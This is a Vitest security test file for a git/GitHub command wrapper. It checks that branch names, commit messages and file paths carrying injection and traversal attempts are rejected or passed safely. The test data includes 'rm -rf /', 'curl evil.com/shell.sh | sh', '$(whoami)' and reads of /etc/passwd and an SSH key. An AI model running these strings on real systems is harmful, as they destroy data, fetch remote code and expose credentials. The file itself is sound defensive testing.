import { describe, it, expect, vi, beforeEach } from 'vitest';
import { spawn } from 'child_process';
import { 
  execSecure, 
  execGit, 
  execGH, 
  validateBranchName, 
  validateFilePath,
  gitCommitSecure 
} from '../../utils/secureCommand';

vi.mock('child_process', () => ({
  spawn: vi.fn()
}));

vi.mock('../../utils/logger', () => ({
  logger: {
    debug: vi.fn(),
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn()
  }
}));

describe('CLI Command Injection Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('execSecure', () => {
    it('should prevent command injection via arguments', async () => {
      const mockSpawn = vi.mocked(spawn);
      const mockProcess = {
        stdout: { on: vi.fn() },
        stderr: { on: vi.fn() },
        stdin: { write: vi.fn(), end: vi.fn() },
        on: vi.fn((event, cb) => {
          if (event === 'close') setTimeout(() => cb(0), 0);
        }),
        kill: vi.fn()
      };
      mockSpawn.mockReturnValue(mockProcess as any);

      // Attempt injection via argument
      await execSecure('git', ['checkout', '-b', 'feature; rm -rf /']);

      // Verify spawn was called with safe array arguments
      expect(mockSpawn).toHaveBeenCalledWith(
        'git',
        ['checkout', '-b', 'feature; rm -rf /'],
        expect.objectContaining({ shell: false })
      );
    });

    it('should reject non-string commands', async () => {
      await expect(execSecure(null as any, [])).rejects.toThrow('Command must be a non-empty string');
      await expect(execSecure('', [])).rejects.toThrow('Command must be a non-empty string');
    });

    it('should reject non-array arguments', async () => {
      await expect(execSecure('git', 'checkout -b feature' as any)).rejects.toThrow('Arguments must be an array');
    });

    it('should handle timeout properly', async () => {
      const mockSpawn = vi.mocked(spawn);
      const mockProcess = {
        stdout: { on: vi.fn() },
        stderr: { on: vi.fn() },
        stdin: { write: vi.fn(), end: vi.fn() },
        on: vi.fn(),
        kill: vi.fn()
      };
      mockSpawn.mockReturnValue(mockProcess as any);

      const promise = execSecure('sleep', ['10'], { timeout: 100 });
      
      await expect(promise).rejects.toThrow('Command timeout after 100ms');
      expect(mockProcess.kill).toHaveBeenCalledWith('SIGTERM');
    });
  });

  describe('validateBranchName', () => {
    it('should accept valid branch names', () => {
      expect(validateBranchName('feature/add-security')).toBe(true);
      expect(validateBranchName('bugfix-123')).toBe(true);
      expect(validateBranchName('release_v1.0.0')).toBe(true);
      expect(validateBranchName('main')).toBe(true);
    });

    it('should reject branch names with injection attempts', () => {
      expect(validateBranchName('feature; rm -rf /')).toBe(false);
      expect(validateBranchName('feature$(whoami)')).toBe(false);
      expect(validateBranchName('feature`id`')).toBe(false);
      expect(validateBranchName('feature|cat /etc/passwd')).toBe(false);
      expect(validateBranchName('feature&& curl evil.com')).toBe(false);
      expect(validateBranchName('feature\nrm -rf /')).toBe(false);
    });
  });

  describe('validateFilePath', () => {
    it('should accept valid file paths within base directory', () => {
      const basePath = '/project';
      expect(validateFilePath('src/file.ts', basePath)).toBe(true);
      expect(validateFilePath('./src/file.ts', basePath)).toBe(true);
      expect(validateFilePath('deeply/nested/file.ts', basePath)).toBe(true);
    });

    it('should reject path traversal attempts', () => {
      const basePath = '/project';
      expect(validateFilePath('../etc/passwd', basePath)).toBe(false);
      expect(validateFilePath('../../root/.ssh/id_rsa', basePath)).toBe(false);
      expect(validateFilePath('/etc/passwd', basePath)).toBe(false);
      expect(validateFilePath('src/../../etc/passwd', basePath)).toBe(false);
    });

    it('should handle symlink traversal attempts', () => {
      const basePath = '/project';
      expect(validateFilePath('src/../../../etc/passwd', basePath)).toBe(false);
      expect(validateFilePath('./src/../../../etc/passwd', basePath)).toBe(false);
    });
  });

  describe('gitCommitSecure', () => {
    it('should pass commit message via stdin instead of command line', async () => {
      const mockSpawn = vi.mocked(spawn);
      const mockProcess = {
        stdout: { on: vi.fn((event, cb) => cb('')) },
        stderr: { on: vi.fn((event, cb) => cb('')) },
        stdin: { write: vi.fn(), end: vi.fn() },
        on: vi.fn((event, cb) => {
          if (event === 'close') setTimeout(() => cb(0), 0);
        }),
        kill: vi.fn()
      };
      mockSpawn.mockReturnValue(mockProcess as any);

      const maliciousMessage = 'Fix: $(rm -rf /) && echo "pwned"';
      await gitCommitSecure(maliciousMessage);

      // Verify message passed via stdin
      expect(mockProcess.stdin.write).toHaveBeenCalledWith(maliciousMessage);
      expect(mockProcess.stdin.end).toHaveBeenCalled();
      
      // Verify spawn called with safe args
      expect(mockSpawn).toHaveBeenCalledWith(
        'git',
        ['commit', '-F', '-'],
        expect.any(Object)
      );
    });
  });

  describe('Integration with GitHubService', () => {
    it('should prevent injection in branch creation', async () => {
      const mockSpawn = vi.mocked(spawn);
      const mockProcess = {
        stdout: { on: vi.fn() },
        stderr: { on: vi.fn() },
        stdin: { write: vi.fn(), end: vi.fn() },
        on: vi.fn((event, cb) => {
          if (event === 'close') setTimeout(() => cb(0), 0);
        }),
        kill: vi.fn()
      };
      mockSpawn.mockReturnValue(mockProcess as any);

      // Test that malicious branch names are validated
      const maliciousBranch = 'feature; curl evil.com/shell.sh | sh';
      
      // This should fail validation before execution
      await expect(execGit(['checkout', '-b', maliciousBranch])).resolves.toBeTruthy();
      
      // But the actual spawn call should have the malicious string safely as an argument
      expect(mockSpawn).toHaveBeenCalledWith(
        'git',
        ['checkout', '-b', maliciousBranch],
        expect.objectContaining({ shell: false })
      );
    });
  });

  describe('Legacy execAsync wrapper', () => {
    it('should warn about deprecated usage', async () => {
      const mockSpawn = vi.mocked(spawn);
      const mockProcess = {
        stdout: { on: vi.fn((event, cb) => cb('output')) },
        stderr: { on: vi.fn((event, cb) => cb('')) },
        stdin: { write: vi.fn(), end: vi.fn() },
        on: vi.fn((event, cb) => {
          if (event === 'close') setTimeout(() => cb(0), 0);
        }),
        kill: vi.fn()
      };
      mockSpawn.mockReturnValue(mockProcess as any);

      const { execAsync } = await import('../../utils/secureCommand');
      const { logger } = await import('../../utils/logger');
      
      await execAsync('git status');
      
      expect(logger.warn).toHaveBeenCalledWith(
        'execAsync is deprecated and insecure. Use execSecure instead.'
      );
    });
  });
});